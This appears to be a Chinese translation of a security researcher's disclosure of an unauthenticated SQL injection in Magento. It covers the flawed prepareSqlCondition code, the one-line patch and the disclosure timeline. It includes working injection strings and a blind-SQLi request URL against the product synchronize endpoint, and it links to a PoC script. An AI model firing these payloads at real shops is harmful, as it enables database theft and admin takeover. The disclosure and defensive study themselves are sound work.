@@ -1,0 +1,212 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>文章来源：<a href="https://www.ambionics.io/blog/magento-sqli" target="_blank">https://www.ambionics.io/blog/magento-sqli</a></p>
+<hr/>
+<h3 data-content="1" id="2299273184f16be32a55401ce168d5d4">Magento</h3>
+<p>在几个月前发现了<a href="https://www.ambionics.io/blog/prestashop-privilege-escalation" target="_blank">PrestaShop</a>的漏洞后，我下一个选择的目标是另一个电子商务平台：<a href="https://magento.com/" target="_blank">Magento</a>。Magento是全球使用最广泛的电子商务平台之一，使用该平台的商家去年的数字商务交易总额<strong>超过1010亿美元</strong>。</p>
+<p>正因如此，<a href="https://magento.com/security" target="_blank">Magento非常重视其产品安全</a>，为了确保漏洞能够被修复，magento官方给予白帽子非常丰厚的奖励。目前，Magento<a href="https://magento.com/blog/magento-news/magento-is-now-part-of-adobe" target="_blank">已被Adobe收购</a>，其赏金项目也归属到Adobe的漏洞披露项目中。</p>
+<p>尽管如此，我仍在Mangento上发现了两个危急的漏洞。其中的一个为未经身份验证的SQL注入漏洞。</p>
+<h3 data-content="1" id="f6947a680edc3e411a244dab2a905ca1">代码审计</h3>
+<p>Magento的代码库非常庞大，其中有<strong>超过200万行的PHP代码</strong>。因此，手工审计代码是一件繁琐的事。但是，我们可以从Netanel Rubin发现的两个优秀的RCE漏洞中获得一些启发，因为他们针对两个点：</p>
+<ul>
+<li><a href="https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/" target="_blank">访问控制/路径选择</a></li>
+<li><a href="http://netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/" target="_blank">API</a></li>
+</ul>
+<p>在这两处被审查后，这两个向量似乎已经不存在任何漏洞点了。因此，我选择查看一些尚未爆出漏洞的地方：负责<strong>ORM和DB管理</strong>的代码。</p>
+<h3 data-content="1" id="7ad70eaff737d43cd2956357feee951d">SQL 注入</h3>
+<h4 data-content="1" id="07d85cbb926a7fd2e210eb9c130e9ef8">审计</h4>
+<p>处理DB的主要类为<code>Magento\Framework\DB\Adapter\Pdo\Mysql</code>。在审计几分钟后，我发现<code>prepareSqlCondition</code>函数的方法中有一个有趣的漏洞。</p>
+<pre><code>&lt;?php
+/****
+ ** Build SQL statement for condition
+ **
+ ** If $condition integer or string - exact value will be filtered ('eq' condition)
+ **
+ ** If $condition is array is - one of the following structures is expected:
+ ** - array("from" =&gt; $fromValue, "to" =&gt; $toValue)
+ ** - array("eq" =&gt; $equalValue)
+ ** - array("neq" =&gt; $notEqualValue)
+ ** - array("like" =&gt; $likeValue)
+ ** - array("in" =&gt; array($inValues))
+ ** - array("nin" =&gt; array($notInValues))
+ ** - array("notnull" =&gt; $valueIsNotNull)
+ ** - array("null" =&gt; $valueIsNull)
+ ** - array("gt" =&gt; $greaterValue)
+ ** - array("lt" =&gt; $lessValue)
+ ** - array("gteq" =&gt; $greaterOrEqualValue)
+ ** - array("lteq" =&gt; $lessOrEqualValue)
+ ** - array("finset" =&gt; $valueInSet)
+ ** - array("regexp" =&gt; $regularExpression)
+ ** - array("seq" =&gt; $stringValue)
+ ** - array("sneq" =&gt; $stringValue)
+ **
+ ** If non matched - sequential array is expected and OR conditions
+ ** will be built using above mentioned structure
+ **
+ ** ...
+ **/
+public function prepareSqlCondition($fieldName, $condition)
+{
+    $conditionKeyMap = [                                                    [1]
+        'eq'            =&gt; "{{fieldName}} = ?",
+        'neq'           =&gt; "{{fieldName}} != ?",
+        'like'          =&gt; "{{fieldName}} LIKE ?",
+        'nlike'         =&gt; "{{fieldName}} NOT LIKE ?",
+        'in'            =&gt; "{{fieldName}} IN(?)",
+        'nin'           =&gt; "{{fieldName}} NOT IN(?)",
+        'is'            =&gt; "{{fieldName}} IS ?",
+        'notnull'       =&gt; "{{fieldName}} IS NOT NULL",
+        'null'          =&gt; "{{fieldName}} IS NULL",
+        'gt'            =&gt; "{{fieldName}} &gt; ?",
+        'lt'            =&gt; "{{fieldName}} &lt; ?",
+        'gteq'          =&gt; "{{fieldName}} &gt;= ?",
+        'lteq'          =&gt; "{{fieldName}} &lt;= ?",
+        'finset'        =&gt; "FIND_IN_SET(?, {{fieldName}})",
+        'regexp'        =&gt; "{{fieldName}} REGEXP ?",
+        'from'          =&gt; "{{fieldName}} &gt;= ?",
+        'to'            =&gt; "{{fieldName}} &lt;= ?",
+        'seq'           =&gt; null,
+        'sneq'          =&gt; null,
+        'ntoa'          =&gt; "INET_NTOA({{fieldName}}) LIKE ?",
+    ];
+
+    $query = '';
+    if (is_array($condition)) {
+        $key = key(array_intersect_key($condition, $conditionKeyMap));
+
+        if (isset($condition['from']) || isset($condition['to'])) {         [2]
+            if (isset($condition['from'])) {                                [3]
+                $from  = $this-&gt;_prepareSqlDateCondition($condition, 'from');
+                $query = $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['from'], $from, $fieldName);
+            }
+
+            if (isset($condition['to'])) {                                  [4]
+                $query .= empty($query) ? '' : ' AND ';
+                $to     = $this-&gt;_prepareSqlDateCondition($condition, 'to');
+                $query = $this-&gt;_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName); [5]
+            }
+        } elseif (array_key_exists($key, $conditionKeyMap)) {
+            $value = $condition[$key];
+            if (($key == 'seq') || ($key == 'sneq')) {
+                $key = $this-&gt;_transformStringSqlCondition($key, $value);
+            }
+            if (($key == 'in' || $key == 'nin') &amp;&amp; is_string($value)) {
+                $value = explode(',', $value);
+            }
+            $query = $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap[$key], $value, $fieldName);
+        } else {
+            $queries = [];
+            foreach ($condition as $orCondition) {
+                $queries[] = sprintf('(%s)', $this-&gt;prepareSqlCondition($fieldName, $orCondition));
+            }
+
+            $query = sprintf('(%s)', implode(' OR ', $queries));
+        }
+    } else {
+        $query = $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['eq'], (string)$condition, $fieldName);
+    }
+
+    return $query;
+}
+
+protected function _prepareQuotedSqlCondition($text, $value, $fieldName) [3]
+{
+    $sql = $this-&gt;quoteInto($text, $value);
+    $sql = str_replace('{{fieldName}}', $fieldName, $sql);
+    return $sql;
+}</code></pre>
+<p>总体概括，这个函数利用一个SQL字段名，一个代表某个运算符的数组（<code>=</code>,<code>!=</code>,<code>&gt;</code>等）和一个值构建了SQL条件。该函数使用<code>$conditionKeyMap</code>[1]将条件的别名映射为固定样式，并且使用<code>_prepareQuotedSqlCondition()</code>[2]函数的给定值替换掉别名中的<strong>所有</strong><code>?</code>字符。例如：</p>
+<pre><code>&lt;?php
+   $db-&gt;prepareSqlCondition('username', ['regexp' =&gt; 'my_value']);
+=&gt; $conditionKeyMap['regexp'] = "{{fieldName}} REGEXP ?";
+=&gt; $query = "username REGEXP 'my_value'";</code></pre>
+<p>然而，为了确保字段在一定的范围内，程序通常会使用<code>from</code>和<code>to</code>条件。这里与[2]结合起来时会出现问题。例如：</p>
+<pre><code>&lt;?php
+$db-&gt;prepareSqlCondition('price', [
+    'from' =&gt; '100'
+    'to' =&gt; '1000'
+]);
+$query = "price &gt;= '100' AND price &lt;= '1000'";</code></pre>
+<p>当两个条件（<code>from</code>和<code>to</code>）都存在时，<code>from</code>[3]处的代码先运行，然后在运行<code>to</code>[4]。但是这样将导致[5]处发生一个严重的错误：<code>from</code>生成的查询将被格式化重新利用。</p>
+<p>由于<strong>所有的</strong><code>?</code>都被给定的值替换了，因此如果<code>from</code>值里存在问号，那么它将被替换为<code>to</code>的引用值。接下来我将介绍此处如何打破SQL查询导致SQL注入：</p>
+<pre><code>&lt;?php
+$db-&gt;prepareSqlCondition('price', [
+    'from' =&gt; 'some?value'
+    'to' =&gt; 'BROKEN'
+]);
+# FROM
+   $query = $db-&gt;_prepareQuotedSqlCondition("{{fieldName}} &gt;= ?", 'some?value', 'price')
+-&gt; $query = "price &gt;= 'some?value'"
+# TO
+   $query = $db-&gt;_prepareQuotedSqlCondition($query . "AND {{fieldName}} &lt;= ?", 'BROKEN', 'price')
+-&gt; $query = $db-&gt;_prepareQuotedSqlCondition("price &gt;= 'some?value' AND {{fieldName}} &lt;= ?", 'BROKEN', 'price')
+-&gt; $query = "price &gt;= 'some'BROKEN'value' AND price &lt;= 'BROKEN'"</code></pre>
+<p><code>BROKEN</code>首先出现在引号外，为了有效地实施SQL注入，我们得做一些这样的事：</p>
+<pre><code>&lt;?php
+
+$db-&gt;prepareSqlCondition('price', [
+    'from' =&gt; 'x?'
+    'to' =&gt; ' OR 1=1 -- -'
+]);
+-&gt; $query = "price &gt;= 'x' OR 1=1 -- -'' AND price &lt;= ' OR 1=1 -- -'"</code></pre>
+<p>这是一场代码游戏。关键漏洞代码：</p>
+<pre><code>$query = $this-&gt;_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName);</code></pre>
+<p>如要修补，则应该改为：</p>
+<pre><code>$query = $query . $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['to'], $to, $fieldName);</code></pre>
+<p>这是一个细小的错误，但威力无穷！如果我们能够控制<code>prepareSqlCondition</code>的第二个参数，就可以造成SQL注入。令人惊讶的是，上述漏洞代码自从Magento 1.x就已经存在了。</p>
+<h4 data-content="1" id="fa9da171a3ce0b537190eb7b9b6cdb07">Source</h4>
+<p>前面我已经说过了，Magento有非常多行的代码，要寻找它的漏洞是一件累活。在运行完自动化审计工具后，我开始逐个检查每个控制器直至找到合适的源。我非常幸运，在搜寻十来处位置后，我选择了一个“候选人”：<code>Magento\Catalog\Controller\Product\Frontend\Action\Synchronize</code></p>
+<pre><code>&lt;?php
+
+public function execute()
+{
+    $resultJson = $this-&gt;jsonFactory-&gt;create();
+
+    try {
+        $productsData = $this-&gt;getRequest()-&gt;getParam('ids', []);
+        $typeId = $this-&gt;getRequest()-&gt;getParam('type_id', null);
+        $this-&gt;synchronizer-&gt;syncActions($productsData, $typeId);
+    } catch (\Exception $e) {
+        $resultJson-&gt;setStatusHeader(
+            \Zend\Http\Response::STATUS_CODE_400,
+            \Zend\Http\AbstractMessage::VERSION_11,
+            'Bad Request'
+        );
+    }
+
+    return $resultJson-&gt;setData([]);
+}</code></pre>
+<p>这是最后导致bug的调用栈：</p>
+<pre><code>&lt;?php
+$productsData = $this-&gt;getRequest()-&gt;getParam('ids', []);
+$this-&gt;synchronizer-&gt;syncActions($productsData, $typeId);
+$collection-&gt;addFieldToFilter('product_id', $this-&gt;getProductIdsByActions($productsData));
+$this-&gt;_translateCondition($field, $condition);
+$this-&gt;_getConditionSql($this-&gt;getConnection()-&gt;quoteIdentifier($field), $condition);
+$this-&gt;getConnection()-&gt;prepareSqlCondition($fieldName, $condition);</code></pre>
+<p>这是一个前台SQL盲注URL示例：</p>
+<pre><code>https://magento2website.com/catalog/product_frontend_action/synchronize?
+    type_id=recently_products&amp;
+    ids[0][added_at]=&amp;
+    ids[0][product_id][from]=?&amp;
+    ids[0][product_id][to]=))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330120112-74e90bf4-52a0-1.png"/></p>
+<p>现在可以<strong>读取数据库的所有内容</strong>，我们能够提取出管理员会话或者哈希密钥，然后登入网站后台。</p>
+<h3 data-content="1" id="df4b98fb1bbcd54c49914efb01f8405c">补丁</h3>
+<p>非常简单的一个修复程序:</p>
+<p>文件：<code>vendor/magento/framework/DB/Adapter/Pdo/Mysql.php</code> 2907行</p>
+<pre><code>- $query = $this-&gt;_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName);
++ $query = $query . $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['to'], $to, $fieldName);</code></pre>
+<p>Mangento发布了2.3.1版本，并且为2.2.x, 2.1.x和 1.1推出了补丁程序。请更新你的服务！</p>
+<h3 data-content="1" id="9e9fb3f3b5b61e42cd1bf27544143e84">时间线</h3>
+<ul>
+<li>2018年11月9日：在Bugcrowd上报告该漏洞</li>
+<li>2018年11月26日：漏洞分级为 P1</li>
+<li>2019年3月19日：我们请求更新动态（已经过去了4个月了！）</li>
+<li>2019年3月19日：Magento奖励我们赏金，并告知正在进行修补。</li>
+<li>2019年3月26日：Magento发布了新版本，修补了漏洞。</li>
+</ul>
+<h3 data-content="1" id="efcba3c99fdd79d393f3f4150a483706">POC</h3>
+<p>Magento SQL注入：<a href="https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py" target="_blank">https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py</a></p>
+</div>
+</div>
